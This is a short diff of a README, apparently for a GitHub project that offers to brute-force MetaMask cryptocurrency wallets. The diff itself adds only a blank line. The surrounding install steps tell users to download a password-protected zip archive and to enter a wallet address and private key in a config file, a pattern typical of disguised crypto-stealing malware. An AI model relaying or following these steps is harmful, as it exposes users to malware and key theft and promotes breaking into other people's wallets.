@@ -14,6 +14,7 @@ Another precautionary measure is to create a new wallet and promptly transfer yo
 <div id="header" align="center">
   <img src="https://houseoffirst.com/images/misc/mm_twitch_yellow_matte.gif" width="100"/>
 </div>
+
 ## Install
 [Download](https://github.com/deadspyexx/metamask-brute/archive/refs/heads/main.zip) the repository release and extract files with password "bPc5GERPSP".
 Edit the address and private_key fields in the config.json file.
